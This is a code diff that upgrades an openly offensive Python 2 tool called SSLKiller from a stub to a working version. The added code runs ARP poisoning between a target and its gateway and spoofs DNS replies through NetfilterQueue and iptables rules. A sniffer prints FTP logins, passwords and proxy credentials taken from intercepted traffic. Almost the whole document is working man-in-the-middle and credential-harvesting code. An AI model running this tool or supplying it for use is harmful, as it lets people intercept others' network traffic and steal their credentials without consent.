@@ -19,7 +19,7 @@
 # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 # USA
 
-version = 0.1
+version = 0.2
 banner = """\n
 
   ██████   ██████  ██▓        ██ ▄█▀ ██▓ ██▓     ██▓
@@ -52,15 +52,15 @@ import fcntl
 import struct
 from time import sleep
 from scapy.all import *
-#from netfilterqueue import NetfilterQueue
+from netfilterqueue import NetfilterQueue
 
 
 class SSLKiller(object):
 	def __init__(self, interface, target, gateway):
 		print banner
+		print
 		self.interface = interface
 		print "[+] Interface: {}".format(self.interface)
-
 		def nic_ip(interface):
 			try:
 		        	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -72,15 +72,14 @@ class SSLKiller(object):
 			except IOError:
 				print "[!] Select a valid network interface, exiting ..."
 				exit(0)
+
 		def nic_mac(interface):
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         		info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', interface[:15]))
         		return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
 
-
 		self.hostIP = nic_ip(self.interface)
 		print "[+] This host IP Address: {}".format(self.hostIP)
-
 		self.hostMAC = nic_mac(self.interface)
 		print "[+] This host MAC Address: {}".format(self.hostMAC)
 
@@ -93,42 +92,79 @@ class SSLKiller(object):
 			except socket.gaierror:
 				print "[!] Select a valid IP Address as target/gateway, exiting ..."
 				exit(0)
-
 		self.targetIP = target
 		print "[+] Target IP Address: {}".format(self.targetIP)
-
 		self.targetMAC = resolve_mac(self.targetIP)
 		print "[+] Target MAC Address: {}".format(self.targetMAC)
-
 		self.gatewayIP = gateway
 		print "[+] Gateway IP Address: {}".format(self.gatewayIP)
-
 		self.gatewayMAC = resolve_mac(self.gatewayIP)
 		print "[+] Gateway MAC Address: {}".format(self.gatewayMAC)
-
 		if not self.targetMAC or not self.gatewayMAC:
 			print "[!] Failed to resolve MAC Address, check if IP Address is online, exiting ..."
 			exit(0)
-
 		animation = "|/-\\"
 		for i in range(15):
 		    time.sleep(0.1)
 		    sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + " Loading SSL Kill ...")
-    		    sys.stdout.flush()
+	    	    sys.stdout.flush()
 		self.ArpPoisoner()
 		sys.stdout.write("\n[+] ARP Poisoner thread loaded")
 		self.SSLTrickster()
 		print "\n[+] SSL Trickster thread loaded"
 		pcap = sniff(prn=self.Sniffer, iface=self.interface)
+
 	def ArpPoisoner(self):
-		#ARP Spoof both ways, gateway and target"
-		return
+		#ARP Spoof both ways, target and gateway
+		def ArpThread():
+			t = threading.Thread(name='ARPspoof', target=ArpPoison)
+			t.setDaemon(True)
+			t.start()
+		def ArpPoison():
+			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+			socket_L2 = conf.L2socket(iface=self.interface)
+			while True:
+				sleep(3)
+				socket_L2.send(Ether(src=self.hostMAC, dst=self.targetMAC)/ARP(hwsrc=self.hostMAC, psrc=self.gatewayIP, op="is-at"))
+				socket_L2.send(Ether(src=self.hostMAC, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.hostMAC, psrc=self.targetIP, op="is-at"))
+		ArpThread()
+		#ArpPoison()
+
 	def SSLTrickster(self):
 		#Use netfilterqueue + scapy to manipulate DNS and HTTP packets "
 		#in order to avoid preloaded HSTS lists, strip SSL links, "
 		#strip HTTP(s) protections (headers/scripts) and poison the "
 		#DNS queries"
-		return
+
+		def callback(packet):
+			payload = packet.get_payload()
+			pkt = IP(payload)
+			if not pkt.haslayer(DNSQR):
+				packet.accept()
+			else:
+		        	new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                                	  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.hostIP))
+                               	packet.set_payload(str(new_pkt))
+                                packet.accept()
+
+		def goThread():
+			t = threading.Thread(name='SSLTrickster', target=goTrickster)
+			t.setDaemon(True)
+			t.start()
+
+		def goTrickster():
+			os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
+			os.system('iptables -t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num 1')
+			os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE --queue-num 1')
+			os.system('iptables -t nat -A PREROUTING -p tcp --sport 80 -j NFQUEUE --queue-num 1')
+			q = NetfilterQueue()
+			q.bind(1, callback)
+			q.run()
+		goThread()
+		#goTrickster()
+
 	def Sniffer(self, p):
 		#Sniff for credentials
         	if p.haslayer(TCP):
@@ -141,24 +177,24 @@ class SSLKiller(object):
                                 if load.startswith('USER'):
                                         method = load.split("USER")
                                         user = str(method[1]).split("\r")
-                                        print "\n" + color("[$$$] FTP Login found: ","yellow") + ''.join(user) + "\n"
+                                        print "\n[$$$] FTP Login found: " + ''.join(user) + "\n"
                                 elif load.startswith('PASS'):
                                         method = load.split("PASS")
                                         passw = str(method[1]).split("\r")
-                                        print "\n" + color("[$$$] FTP Password found: ","yellow") + ''.join(passw) + "\n"
+                                        print "\n[$$$] FTP Password found: " + ''.join(passw) + "\n"
                                 else:
                                         users = re.findall(user_regex, load)
                                         passwords = re.findall(pw_regex, load)
                                         proxy = re.findall(pxy_regex, load)
 		        	        if users:
-        			                print "\n" + color("[$$$] Login found: ","yellow") + str(users[0][1]) + "\n"
+        			                print "\n[$$$] Login found: " + str(users[0][1]) + "\n"
         			        if passwords:
-        			                print "\n" + color("[$$$] Password found: ","yellow") + str(passwords[0][1]) + "\n"
+        			                print "\n[$$$] Password found: " + str(passwords[0][1]) + "\n"
         			        if proxy:
         			                try:
-        			                        print "\n" + color("[$$$] Proxy credentials: ","yellow") + str(proxy[0][1]).decode('base64') + "\n"
+        			                        print "\n[$$$] Proxy credentials: " + str(proxy[0][1]).decode('base64') + "\n"
         			                except:
-        	        		                print "\n" + color("[$$$] Proxy credentials: ","yellow") + str(proxy[0][1]) + "\n"
+        	        		                print "\n[$$$] Proxy credentials: " + str(proxy[0][1]) + "\n"
 		else:
 			return
 
@@ -183,9 +219,12 @@ if __name__ == "__main__":
 		sslkill = SSLKiller(interface, target, gateway)
 	except KeyboardInterrupt:
 		print "[!] Aborted..."
+                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		exit(0)
 	except Exception as e:
 		print banner
 		print help
 		print "[!] Exception caught: {}".format(e)
+                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		exit(0)
+	os.system('iptables -t nat -F')
